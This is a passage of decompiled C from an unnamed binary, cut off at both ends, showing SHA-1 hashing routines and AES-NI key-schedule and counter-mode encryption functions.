  a2[5] = v256 + v139 + __ROL4__(v50 + v111 + (v37 ^ v35 ^ v196), 11) + a2[6];
  v40 = v317 + v37 + a2[2];
  a2[3] = v196 + v39;
  a2[6] = v40;
  a2[2] = v38;
  return 0;
}

//----- (00410280) --------------------------------------------------------
int __usercall sub_410280@<eax>(int a1@<ebx>, __m128i *a2, unsigned int a3)
{
  unsigned int v3; // ecx
  int v4; // edi
  unsigned int v5; // eax
  unsigned int v6; // esi
  int result; // eax
  unsigned int v8; // eax

  v3 = a3;
  v4 = *(_DWORD *)a1 & 0x3F;
  v5 = a3 + *(_DWORD *)a1;
  v6 = 64 - v4;
  *(_DWORD *)a1 = v5;
  if ( v5 < a3 )
    ++*(_DWORD *)(a1 + 4);
  if ( v4 && a3 >= v6 )
  {
    sub_415930(v4 + a1 + 28, a2, 64 - v4);
    result = sub_40E6B0((unsigned __int8 *)(a1 + 28), (_DWORD *)a1);
    if ( result )
      return result;
    a3 -= v6;
    a2 = (__m128i *)((char *)a2 + v6);
    v3 = a3;
    v4 = 0;
  }
  if ( v3 < 0x40 )
  {
LABEL_11:
    if ( v3 )
      sub_415930(v4 + a1 + 28, a2, v3);
    return 0;
  }
  else
  {
    while ( 1 )
    {
      result = sub_40E6B0((unsigned __int8 *)a2, (_DWORD *)a1);
      if ( result )
        break;
      a2 += 4;
      v8 = a3 - 64;
      a3 = v8;
      if ( v8 < 0x40 )
      {
        v3 = v8;
        goto LABEL_11;
      }
    }
  }
  return result;
}

//----- (00410320) --------------------------------------------------------
int __usercall sub_410320@<eax>(int a1@<eax>, _BYTE *a2@<edi>)
{
  unsigned int v3; // esi
  int v4; // eax
  unsigned int v5; // esi
  int v6; // eax
  unsigned int v7; // eax
  int result; // eax
  __int16 v9; // [esp+8h] [ebp-8h] BYREF
  char v10; // [esp+Ah] [ebp-6h]
  char v11; // [esp+Bh] [ebp-5h]
  int v12; // [esp+Ch] [ebp-4h]

  v3 = *(_DWORD *)a1;
  v4 = *(__int64 *)a1 >> 29;
  v9 = 8 * v3;
  v10 = v3 >> 13;
  v11 = (8 * v3) >> 24;
  v12 = v4;
  v5 = v3 & 0x3F;
  v6 = 56;
  if ( v5 >= 0x38 )
    v6 = 120;
  v7 = v6 - v5;
  if ( !v7 || (result = sub_410280(a1, stru_41E490, v7)) == 0 )
  {
    result = sub_410280(a1, (__m128i *)&v9, 8u);
    if ( !result )
    {
      *a2 = *(_BYTE *)(a1 + 8);
      a2[1] = *(_BYTE *)(a1 + 9);
      a2[2] = *(_BYTE *)(a1 + 10);
      a2[3] = *(_BYTE *)(a1 + 11);
      a2[4] = *(_BYTE *)(a1 + 12);
      a2[5] = *(_BYTE *)(a1 + 13);
      a2[6] = *(_BYTE *)(a1 + 14);
      a2[7] = *(_BYTE *)(a1 + 15);
      a2[8] = *(_BYTE *)(a1 + 16);
      a2[9] = *(_BYTE *)(a1 + 17);
      a2[10] = *(_BYTE *)(a1 + 18);
      a2[11] = *(_BYTE *)(a1 + 19);
      a2[12] = *(_BYTE *)(a1 + 20);
      a2[13] = *(_BYTE *)(a1 + 21);
      a2[14] = *(_BYTE *)(a1 + 22);
      a2[15] = *(_BYTE *)(a1 + 23);
      a2[16] = *(_BYTE *)(a1 + 24);
      a2[17] = *(_BYTE *)(a1 + 25);
      a2[18] = *(_BYTE *)(a1 + 26);
      a2[19] = *(_BYTE *)(a1 + 27);
      return 0;
    }
  }
  return result;
}
// 41E490: using guessed type __m128i stru_41E490[56];

//----- (00410450) --------------------------------------------------------
int __cdecl sub_410450(__m128i *a1, unsigned int a2, _BYTE *a3)
{
  int v3; // edi
  int v5[23]; // [esp+4h] [ebp-5Ch] BYREF

  sub_413EB0((int)v5, 0, 0x5Cu);
  v5[0] = 0;
  v5[1] = 0;
  v5[2] = 1732584193;
  v5[3] = -271733879;
  v5[4] = -1732584194;
  v5[5] = 271733878;
  v5[6] = -1009589776;
  if ( !a2 || (v3 = sub_410280((int)v5, a1, a2)) == 0 )
    v3 = sub_410320((int)v5, a3);
  sub_413EB0((int)v5, 0, 0x5Cu);
  return v3;
}

//----- (00411800) --------------------------------------------------------
__m128i *__cdecl sub_411800(const __m128i *a1, __m128i *a2)
{
  __m128i *v2; // edx
  __m128i v3; // xmm1
  __m128i v4; // xmm2
  __m128i si128; // xmm4
  int v7; // eax
  __m128i v10; // xmm3
  __m128i v11; // xmm1
  __m128i v12; // xmm3
  __m128i *result; // eax
  __m128i v18; // xmm3
  __m128i v19; // xmm1
  __m128i v20; // xmm3
  __m128i v21; // xmm1
  __m128i v24; // xmm3
  __m128i v25; // xmm1
  __m128i v26; // xmm3

  v2 = a2;
  v3 = _mm_loadu_si128(a1);
  *a2 = v3;
  v4 = v3;
  _XMM0 = _mm_load_si128(&stru_423030);
  si128 = _mm_load_si128(&stru_423000);
  v7 = 8;
  do
  {
    ++v2;
    --v7;
    _XMM2 = _mm_shuffle_epi8(v4, si128);
    __asm { aesenclast xmm2, xmm0 }
    _XMM0 = _mm_slli_epi32(_XMM0, 1u);
    v10 = _mm_slli_si128(v3, 4);
    v11 = _mm_xor_si128(v3, v10);
    v12 = _mm_slli_si128(v10, 4);
    v3 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v11, v12), _mm_slli_si128(v12, 4)), _XMM2);
    *v2 = v3;
    v4 = v3;
  }
  while ( v7 );
  result = &stru_423040;
  _XMM0 = _mm_load_si128(&stru_423040);
  _XMM2 = _mm_shuffle_epi8(v3, si128);
  __asm { aesenclast xmm2, xmm0 }
  _XMM0 = _mm_slli_epi32(_XMM0, 1u);
  v18 = _mm_slli_si128(v3, 4);
  v19 = _mm_xor_si128(v3, v18);
  v20 = _mm_slli_si128(v18, 4);
  v21 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v19, v20), _mm_slli_si128(v20, 4)), _XMM2);
  v2[1] = v21;
  _XMM2 = _mm_shuffle_epi8(v21, si128);
  __asm { aesenclast xmm2, xmm0 }
  v24 = _mm_slli_si128(v21, 4);
  v25 = _mm_xor_si128(v21, v24);
  v26 = _mm_slli_si128(v24, 4);
  v2[2] = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v25, v26), _mm_slli_si128(v26, 4)), _XMM2);
  return result;
}
// 423000: using guessed type __m128i stru_423000;
// 423030: using guessed type __m128i stru_423030;
// 423040: using guessed type __m128i stru_423040;

//----- (004119B0) --------------------------------------------------------
int __cdecl sub_4119B0(const __m128i *a1, __m128i *a2)
{
  __m128i *v2; // edx
  __m128i v3; // xmm1
  __m128i inserted; // xmm3
  __m128d v5; // xmm5
  __m128i v7; // xmm4
  int result; // eax
  __m128i v12; // xmm6
  __m128i v13; // xmm1
  __m128i v14; // xmm6
  __m128d v15; // xmm1
  __m128d v16; // xmm3
  __m128i v19; // xmm6
  __m128i v20; // xmm1
  __m128i v21; // xmm6

  v2 = a2;
  v3 = _mm_loadu_si128(a1);
  inserted = _mm_insert_epi32(_mm_insert_epi32((__m128i)0i64, a1[1].m128i_i32[0], 0), a1[1].m128i_i32[1], 1);
  *a2 = v3;
  v5 = (__m128d)inserted;
  _XMM0 = _mm_loadu_si128(&stru_423030);
  v7 = _mm_loadu_si128(&stru_423010);
  result = 4;
  do
  {
    _XMM2 = _mm_shuffle_epi8(inserted, v7);
    __asm { aesenclast xmm2, xmm0 }
    _XMM0 = _mm_slli_epi32(_XMM0, 1u);
    v12 = _mm_slli_si128(v3, 4);
    v13 = _mm_xor_si128(v3, v12);
    v14 = _mm_slli_si128(v12, 4);
    v15 = (__m128d)_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v13, v14), _mm_slli_si128(v14, 4)), _XMM2);
    v16 = (__m128d)_mm_xor_si128(
                     _mm_xor_si128(inserted, _mm_slli_si128(inserted, 4)),
                     _mm_shuffle_epi32((__m128i)v15, 255));
    v2[1] = (__m128i)_mm_shuffle_pd(v5, v15, 0);
    v2[2] = (__m128i)_mm_shuffle_pd(v15, v16, 1);
    _XMM2 = _mm_shuffle_epi8((__m128i)v16, v7);
    __asm { aesenclast xmm2, xmm0 }
    _XMM0 = _mm_slli_epi32(_XMM0, 1u);
    v19 = _mm_slli_si128((__m128i)v15, 4);
    v20 = _mm_xor_si128((__m128i)v15, v19);
    v21 = _mm_slli_si128(v19, 4);
    v3 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v20, v21), _mm_slli_si128(v21, 4)), _XMM2);
    inserted = _mm_xor_si128(_mm_xor_si128((__m128i)v16, _mm_slli_si128((__m128i)v16, 4)), _mm_shuffle_epi32(v3, 255));
    v2[3] = v3;
    v5 = (__m128d)inserted;
    v2 += 3;
    --result;
  }
  while ( result );
  v2[1] = inserted;
  return result;
}
// 423010: using guessed type __m128i stru_423010;
// 423030: using guessed type __m128i stru_423030;

//----- (00411BB0) --------------------------------------------------------
int __cdecl sub_411BB0(const __m128i *a1, __m128i *a2)
{
  __m128i *v2; // edx
  __m128i v3; // xmm1
  __m128i v4; // xmm3
  __m128i v6; // xmm5
  int result; // eax
  __m128i v11; // xmm4
  __m128i v12; // xmm1
  __m128i v13; // xmm4
  __m128i v16; // xmm4
  __m128i v17; // xmm3
  __m128i v18; // xmm4
  __m128i v21; // xmm4
  __m128i v22; // xmm1
  __m128i v23; // xmm4

  v2 = a2;
  v3 = _mm_loadu_si128(a1);
  v4 = _mm_loadu_si128(a1 + 1);
  *a2 = v3;
  a2[1] = v4;
  _XMM0 = _mm_loadu_si128(&stru_423030);
  v6 = _mm_loadu_si128(&stru_423020);
  _XMM6 = 0i64;
  result = 6;
  do
  {
    _XMM2 = _mm_shuffle_epi8(v4, v6);
    __asm { aesenclast xmm2, xmm0 }
    _XMM0 = _mm_slli_epi32(_XMM0, 1u);
    v11 = _mm_slli_si128(v3, 4);
    v12 = _mm_xor_si128(v3, v11);
    v13 = _mm_slli_si128(v11, 4);
    v3 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v12, v13), _mm_slli_si128(v13, 4)), _XMM2);
    v2[2] = v3;
    _XMM2 = _mm_shuffle_epi32(v3, 255);
    __asm { aesenclast xmm2, xmm6 }
    v16 = _mm_slli_si128(v4, 4);
    v17 = _mm_xor_si128(v4, v16);
    v18 = _mm_slli_si128(v16, 4);
    v4 = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v17, v18), _mm_slli_si128(v18, 4)), _XMM2);
    v2[3] = v4;
    v2 += 2;
    --result;
  }
  while ( result );
  _XMM2 = _mm_shuffle_epi8(v4, v6);
  __asm { aesenclast xmm2, xmm0 }
  v21 = _mm_slli_si128(v3, 4);
  v22 = _mm_xor_si128(v3, v21);
  v23 = _mm_slli_si128(v21, 4);
  v2[2] = _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v22, v23), _mm_slli_si128(v23, 4)), _XMM2);
  return result;
}
// 423020: using guessed type __m128i stru_423020;
// 423030: using guessed type __m128i stru_423030;

//----- (00411F54) --------------------------------------------------------
int __cdecl sub_411F54(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6)
{
  __m128i v10; // xmm2

  _XMM0 = _mm_loadu_si128((const __m128i *)(a1 + 12));
  v10 = _mm_loadu_si128((const __m128i *)(a1 + 44));
  _XMM3 = _mm_loadu_si128((const __m128i *)(a1 + 60));
  _XMM4 = _mm_loadu_si128((const __m128i *)(a1 + 76));
  _XMM5 = _mm_loadu_si128((const __m128i *)(a1 + 92));
  _XMM6 = _mm_loadu_si128((const __m128i *)(a1 + 108));
  while ( a6 >= 0x10 )
  {
    _XMM0 = _mm_xor_si128(_XMM0, _mm_xor_si128(_mm_loadu_si128(a5), v10));
    __asm
    {
      aesenc  xmm0, xmm3
      aesenc  xmm0, xmm4
      aesenc  xmm0, xmm5
      aesenc  xmm0, xmm6
    }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 124));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 140));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 156));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 172));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 188));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 204));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 220));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 236));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 252));
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128((const __m128i *)(a1 + 268));
    __asm { aesenclast xmm0, xmm7 }
    *a2 = _XMM0;
    ++a5;
    ++a2;
    a6 -= 16;
  }
  *(__m128i *)(a1 + 12) = _XMM0;
  return 0;
}

//----- (00412B00) --------------------------------------------------------
int __cdecl sub_412B00(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6)
{
  const __m128i *v9; // ecx
  unsigned __int32 v10; // esi
  unsigned int v11; // esi
  unsigned int v27; // esi
  __m128i v100; // xmm1
  __m128i v101; // xmm2
  __m128i v102; // xmm3
  __m128i v103; // xmm4
  __m128i v104; // xmm5
  __m128i v105; // xmm6
  __m128i v128; // [esp+0h] [ebp-70h] BYREF
  __m128i v129; // [esp+10h] [ebp-60h] BYREF
  __m128i v130; // [esp+20h] [ebp-50h] BYREF
  __m128i v131; // [esp+30h] [ebp-40h] BYREF
  __m128i v132; // [esp+40h] [ebp-30h] BYREF
  __m128i v133; // [esp+50h] [ebp-20h] BYREF
  __m128i v134; // [esp+60h] [ebp-10h] BYREF

  v9 = (const __m128i *)(*(_DWORD *)(a1 + 4) + 44);
  v10 = _byteswap_ulong(*(_DWORD *)(a1 + 20));
  v128 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 8)), _mm_loadu_si128(v9));
  v129 = v128;
  v130 = v128;
  v131 = v128;
  v132 = v128;
  v133 = v128;
  v134 = v128;
  v129.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v130.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v131.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v132.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v133.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v11 = v10 + 1;
  v134.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v11);
  while ( a6 >= 0x70 )
  {
    _XMM0 = _mm_loadu_si128(&v128);
    _XMM1 = _mm_loadu_si128(&v129);
    _XMM2 = _mm_loadu_si128(&v130);
    _XMM3 = _mm_loadu_si128(&v131);
    _XMM4 = _mm_loadu_si128(&v132);
    _XMM5 = _mm_loadu_si128(&v133);
    _XMM6 = _mm_loadu_si128(&v134);
    _XMM7 = _mm_loadu_si128(v9 + 1);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v27 = v11 + 1;
    v128.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v27);
    _XMM7 = _mm_loadu_si128(v9 + 2);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v129.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 3);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v130.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 4);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v131.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 5);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v132.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 6);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v133.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 7);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v11 = v27 + 1;
    v134.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v11);
    _XMM7 = _mm_loadu_si128(v9 + 8);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 9);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 10);
    __asm
    {
      aesenclast xmm0, xmm7
      aesenclast xmm1, xmm7
      aesenclast xmm2, xmm7
      aesenclast xmm3, xmm7
      aesenclast xmm4, xmm7
      aesenclast xmm5, xmm7
      aesenclast xmm6, xmm7
    }
    v100 = _mm_xor_si128(_XMM1, _mm_loadu_si128(a5 + 1));
    v101 = _mm_xor_si128(_XMM2, _mm_loadu_si128(a5 + 2));
    v102 = _mm_xor_si128(_XMM3, _mm_loadu_si128(a5 + 3));
    v103 = _mm_xor_si128(_XMM4, _mm_loadu_si128(a5 + 4));
    v104 = _mm_xor_si128(_XMM5, _mm_loadu_si128(a5 + 5));
    v105 = _mm_xor_si128(_XMM6, _mm_loadu_si128(a5 + 6));
    *a2 = _mm_xor_si128(_XMM0, _mm_loadu_si128(a5));
    a2[1] = v100;
    a2[2] = v101;
    a2[3] = v102;
    a2[4] = v103;
    a2[5] = v104;
    a2[6] = v105;
    a5 += 7;
    a2 += 7;
    a6 -= 112;
  }
  while ( a6 >= 0x10 )
  {
    _XMM0 = _mm_loadu_si128(&v128);
    _XMM7 = _mm_loadu_si128(v9 + 1);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 2);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 3);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 4);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 5);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 6);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 7);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 8);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 9);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 10);
    __asm { aesenclast xmm0, xmm7 }
    *a2++ = _mm_xor_si128(_XMM0, _mm_loadu_si128(a5++));
    a6 -= 16;
  }
  *(__m128i *)(a1 + 8) = _mm_xor_si128(_mm_loadu_si128(&v128), _mm_loadu_si128(v9));
  return 0;
}

//----- (00412EF0) --------------------------------------------------------
int __cdecl sub_412EF0(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6)
{
  const __m128i *v9; // ecx
  unsigned __int32 v10; // esi
  unsigned int v11; // esi
  unsigned int v27; // esi
  __m128i v116; // xmm1
  __m128i v117; // xmm2
  __m128i v118; // xmm3
  __m128i v119; // xmm4
  __m128i v120; // xmm5
  __m128i v121; // xmm6
  __m128i v148; // [esp+0h] [ebp-70h] BYREF
  __m128i v149; // [esp+10h] [ebp-60h] BYREF
  __m128i v150; // [esp+20h] [ebp-50h] BYREF
  __m128i v151; // [esp+30h] [ebp-40h] BYREF
  __m128i v152; // [esp+40h] [ebp-30h] BYREF
  __m128i v153; // [esp+50h] [ebp-20h] BYREF
  __m128i v154; // [esp+60h] [ebp-10h] BYREF

  v9 = (const __m128i *)(*(_DWORD *)(a1 + 4) + 44);
  v10 = _byteswap_ulong(*(_DWORD *)(a1 + 20));
  v148 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)(a1 + 8)), _mm_loadu_si128(v9));
  v149 = v148;
  v150 = v148;
  v151 = v148;
  v152 = v148;
  v153 = v148;
  v154 = v148;
  v149.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v150.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v151.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v152.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v153.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v10);
  v11 = v10 + 1;
  v154.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v11);
  while ( a6 >= 0x70 )
  {
    _XMM0 = _mm_loadu_si128(&v148);
    _XMM1 = _mm_loadu_si128(&v149);
    _XMM2 = _mm_loadu_si128(&v150);
    _XMM3 = _mm_loadu_si128(&v151);
    _XMM4 = _mm_loadu_si128(&v152);
    _XMM5 = _mm_loadu_si128(&v153);
    _XMM6 = _mm_loadu_si128(&v154);
    _XMM7 = _mm_loadu_si128(v9 + 1);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v27 = v11 + 1;
    v148.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v27);
    _XMM7 = _mm_loadu_si128(v9 + 2);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v149.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 3);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v150.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 4);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v151.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 5);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v152.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 6);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v153.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(++v27);
    _XMM7 = _mm_loadu_si128(v9 + 7);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    v11 = v27 + 1;
    v154.m128i_i32[3] = v9->m128i_i32[3] ^ _byteswap_ulong(v11);
    _XMM7 = _mm_loadu_si128(v9 + 8);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 9);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 10);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 11);
    __asm
    {
      aesenc  xmm0, xmm7
      aesenc  xmm1, xmm7
      aesenc  xmm2, xmm7
      aesenc  xmm3, xmm7
      aesenc  xmm4, xmm7
      aesenc  xmm5, xmm7
      aesenc  xmm6, xmm7
    }
    _XMM7 = _mm_loadu_si128(v9 + 12);
    __asm
    {
      aesenclast xmm0, xmm7
      aesenclast xmm1, xmm7
      aesenclast xmm2, xmm7
      aesenclast xmm3, xmm7
      aesenclast xmm4, xmm7
      aesenclast xmm5, xmm7
      aesenclast xmm6, xmm7
    }
    v116 = _mm_xor_si128(_XMM1, _mm_loadu_si128(a5 + 1));
    v117 = _mm_xor_si128(_XMM2, _mm_loadu_si128(a5 + 2));
    v118 = _mm_xor_si128(_XMM3, _mm_loadu_si128(a5 + 3));
    v119 = _mm_xor_si128(_XMM4, _mm_loadu_si128(a5 + 4));
    v120 = _mm_xor_si128(_XMM5, _mm_loadu_si128(a5 + 5));
    v121 = _mm_xor_si128(_XMM6, _mm_loadu_si128(a5 + 6));
    *a2 = _mm_xor_si128(_XMM0, _mm_loadu_si128(a5));
    a2[1] = v116;
    a2[2] = v117;
    a2[3] = v118;
    a2[4] = v119;
    a2[5] = v120;
    a2[6] = v121;
    a5 += 7;
    a2 += 7;
    a6 -= 112;
  }
  while ( a6 >= 0x10 )
  {
    _XMM0 = _mm_loadu_si128(&v148);
    _XMM7 = _mm_loadu_si128(v9 + 1);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 2);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 3);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 4);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 5);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 6);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 7);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 8);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 9);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 10);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 11);
    __asm { aesenc  xmm0, xmm7 }
    _XMM7 = _mm_loadu_si128(v9 + 12);
    __asm { aesenclast xmm0, xmm7 }
    *a2++ = _mm_xor_si128(_XMM0, _mm_loadu_si128(a5++));
    a6 -= 16;
  }
  *(__m128i *)(a1 + 8) = _mm_xor_si128(_mm_loadu_si128(&v148), _mm_loadu_si128(v9));
  return 0;
}

//----- (00413350) --------------------------------------------------------
int __cdecl sub_413350(int a1, __m128i *a2, int a3, int a4, const __m128i *a5, unsigned int a6)
{
  const __m128i *v9; // ecx
  unsigned __int32 v10; // esi
  unsigned int v11; // esi
  unsigned int v27; // esi
  __m128i v132; // xmm1
  __m128i v133; // xmm2
  __m128i v134; // xmm3
  __m128i v135; // xmm4
